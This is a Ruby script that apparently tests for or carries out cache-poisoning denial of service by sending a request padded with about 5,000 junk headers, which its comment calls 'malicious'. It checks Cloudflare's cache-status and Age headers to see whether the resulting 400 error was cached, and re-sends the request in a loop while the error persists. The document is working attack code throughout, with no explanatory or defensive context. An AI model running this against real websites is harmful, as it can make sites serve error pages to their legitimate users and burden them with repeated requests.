require 'net/http'
uri = URI("https://www.examle.com/")
req = Net::HTTP::Get.new(uri)
req["Accept-Encoding"] = "gzip, deflate, br"
req["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"

num = 5000
i = 0

# Setting malicious and irrelevant headers fields for creating an oversized header
until i > num  do
	req["content-disposition:#{i}"] = "public, max-age=31556926"
	i +=1;
end

res = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => uri.scheme == 'https') {|http|
	http.request(req)
}
cacheStatus = res["cf-cache-status"]
age = res["Age"]
code = res.code.to_i

puts "Cach-Status: #{cacheStatus}" + " Age: #{age} Timestamp: " + Time.new.getutc.to_s + "Code: #{code}"
while code == 400
    
    res = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => uri.scheme == 'https') {|http|
	http.request(req)
    }
    cacheStatus = res["cf-cache-status"]
    age = res["Age"]
    code = res.code.to_i
    puts "Cach-Status: #{cacheStatus}" + " Age: #{age} Timestamp: " + Time.new.getutc.to_s + "Code: #{code}"
end
